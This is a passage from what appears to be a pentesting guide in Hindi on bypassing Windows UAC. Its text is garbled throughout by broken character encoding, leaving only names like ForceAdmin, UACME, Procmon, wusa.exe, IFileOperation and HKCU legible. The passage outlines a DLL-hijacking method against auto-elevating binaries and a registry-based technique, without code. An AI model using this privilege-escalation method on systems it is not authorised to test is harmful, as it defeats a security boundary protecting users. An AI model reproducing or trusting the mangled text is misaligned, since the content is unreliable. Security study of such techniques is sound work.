‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§∂‡•ã‡§∞‡§ó‡•Å‡§≤ ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§ö‡§ø‡§Ç‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡•ã ‡§Ü‡§™ ‡§π‡§Æ‡•á‡§∂‡§æ ‡§ï‡•Å‡§õ ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡§æ ‡§ï‡•Å‡§õ ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ‡§ú‡•ã **‡§â‡§ö‡•ç‡§ö‡§§‡§Æ ‡§∏‡•ç‡§µ‡•Ä‡§ï‡•É‡§§‡§ø ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•Ç‡§õ‡§§‡§æ ‡§π‡•à ‡§ú‡§¨ ‡§§‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§á‡§∏‡•á ‡§∏‡•ç‡§µ‡•Ä‡§ï‡§æ‡§∞ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡§æ**‡•§

### ‡§Ö‡§™‡§®‡§æ ‡§¨‡§æ‡§á‡§™‡§æ‡§∏ - ‡§Æ‡•å‡§≤‡§ø‡§ï UAC ‡§¨‡§æ‡§á‡§™‡§æ‡§∏ ‡§Æ‡•á‡§•‡§°‡•ã‡§≤‡•â‡§ú‡•Ä

‡§Ø‡§¶‡§ø ‡§Ü‡§™ **UACME** ‡§ï‡•Ä ‡§ì‡§∞ ‡§¶‡•á‡§ñ‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡•ã ‡§Ü‡§™ ‡§¶‡•á‡§ñ‡•á‡§Ç‡§ó‡•á ‡§ï‡§ø **‡§Ö‡§ß‡§ø‡§ï‡§æ‡§Ç‡§∂ UAC ‡§¨‡§æ‡§á‡§™‡§æ‡§∏ ‡§è‡§ï Dll ‡§π‡§æ‡§á‡§ú‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§¶‡•ã‡§∑** ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç (‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§ó‡•ç‡§Ø‡§™‡•Ç‡§∞‡•ç‡§£ dll ‡§ï‡•ã _C:\Windows\System32_ ‡§™‡§∞ ‡§≤‡§ø‡§ñ‡§®‡§æ)‡•§ [‡§è‡§ï Dll ‡§π‡§æ‡§á‡§ú‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§¶‡•ã‡§∑ ‡§ï‡•à‡§∏‡•á ‡§ñ‡•ã‡§ú‡•á‡§Ç ‡§á‡§∏‡•á ‡§∏‡•Ä‡§ñ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ø‡§π ‡§™‡§¢‡§º‡•á‡§Ç](../windows-local-privilege-escalation/dll-hijacking.md)‡•§

1. ‡§è‡§ï ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§¢‡•Ç‡§Ç‡§¢‡•á‡§Ç ‡§ú‡•ã **‡§∏‡•ç‡§µ‡§§: ‡§â‡§ö‡•ç‡§ö‡§§‡§Æ** ‡§ï‡§∞‡•á‡§ó‡§æ (‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç ‡§ï‡§ø ‡§ú‡§¨ ‡§Ø‡§π ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§§‡•ã ‡§Ø‡§π ‡§â‡§ö‡•ç‡§ö ‡§∏‡§§‡•ç‡§Ø‡§æ‡§™‡§® ‡§∏‡•ç‡§§‡§∞ ‡§Æ‡•á‡§Ç ‡§ö‡§≤‡§§‡§æ ‡§π‡•à)‡•§
2. Procmon ‡§ï‡•á ‡§∏‡§æ‡§• "**NAME NOT FOUND**" ‡§ò‡§ü‡§®‡§æ‡§è‡§Å ‡§ñ‡•ã‡§ú‡•á‡§Ç ‡§ú‡•ã **DLL ‡§π‡§æ‡§á‡§ú‡•à‡§ï‡§ø‡§Ç‡§ó** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§π‡•ã ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡§Ç‡•§
3. ‡§Ü‡§™‡§ï‡•ã ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™‡§ï‡•ã ‡§ï‡•Å‡§õ **‡§∏‡§Ç‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§™‡§•‡•ã‡§Ç** (‡§ú‡•à‡§∏‡•á C:\Windows\System32) ‡§Æ‡•á‡§Ç ‡§°‡•Ä‡§è‡§≤‡§è‡§≤ ‡§≤‡§ø‡§ñ‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§ó‡•Ä‡•§ ‡§Ü‡§™ ‡§á‡§∏‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§á‡§∏‡•á ‡§¨‡§æ‡§á‡§™‡§æ‡§∏ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
1. **wusa.exe**: Windows 7,8 ‡§î‡§∞ 8.1‡•§ ‡§Ø‡§π ‡§∏‡§Ç‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§™‡§•‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§è‡§ï CAB ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•Ä ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§®‡§ø‡§ï‡§æ‡§≤‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à (‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§π ‡§â‡§ö‡•ç‡§ö ‡§∏‡§§‡•ç‡§Ø‡§æ‡§™‡§® ‡§∏‡•ç‡§§‡§∞ ‡§∏‡•á ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à)‡•§
2. **IFileOperation**: Windows 10‡•§
4. ‡§∏‡§Ç‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§™‡§• ‡§Æ‡•á‡§Ç ‡§Ö‡§™‡§®‡•Ä DLL ‡§ï‡•Ä ‡§™‡•ç‡§∞‡§§‡§ø‡§≤‡§ø‡§™‡§ø ‡§¨‡§®‡§æ‡§®‡•á ‡§î‡§∞ ‡§∏‡§Ç‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§™‡§• ‡§Æ‡•á‡§Ç ‡§Ö‡§™‡§®‡•Ä DLL ‡§ï‡•ã ‡§ï‡•â‡§™‡•Ä ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™‡§ø‡§§ ‡§î‡§∞ ‡§∏‡•ç‡§µ‡§§: ‡§â‡§ö‡•ç‡§ö‡§§‡§Æ ‡§∏‡•ç‡§§‡§∞ ‡§ï‡•á ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï **‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü** ‡§§‡•à‡§Ø‡§æ‡§∞ ‡§ï‡§∞‡•á‡§Ç‡•§

### ‡§è‡§ï ‡§î‡§∞ UAC ‡§¨‡§æ‡§á‡§™‡§æ‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï

‡§á‡§∏‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à ‡§ï‡§ø ‡§è‡§ï **‡§∏‡•ç‡§µ‡§§: ‡§â‡§ö‡•ç‡§ö‡§§‡§Æ ‡§∏‡•ç‡§§‡§∞** ‡§ï‡§æ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§Ø‡§¶‡§ø **‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä** ‡§∏‡•á **‡§è‡§ï ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä** ‡§Ø‡§æ **‡§ï‡§Æ‡§æ‡§Ç‡§°** ‡§ï‡§æ **‡§®‡§æ‡§Æ/‡§™‡§•** ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡•ã **‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§** ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è (‡§Ø‡§π ‡§Ö‡§ß‡§ø‡§ï ‡§∞‡•Ç‡§ö‡§ø‡§ï‡§∞ ‡§π‡•à ‡§Ø‡§¶‡§ø ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§á‡§∏ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•ã **HKCU** ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ñ‡•ã‡§ú‡§§‡§æ ‡§π‡•à)‡•§
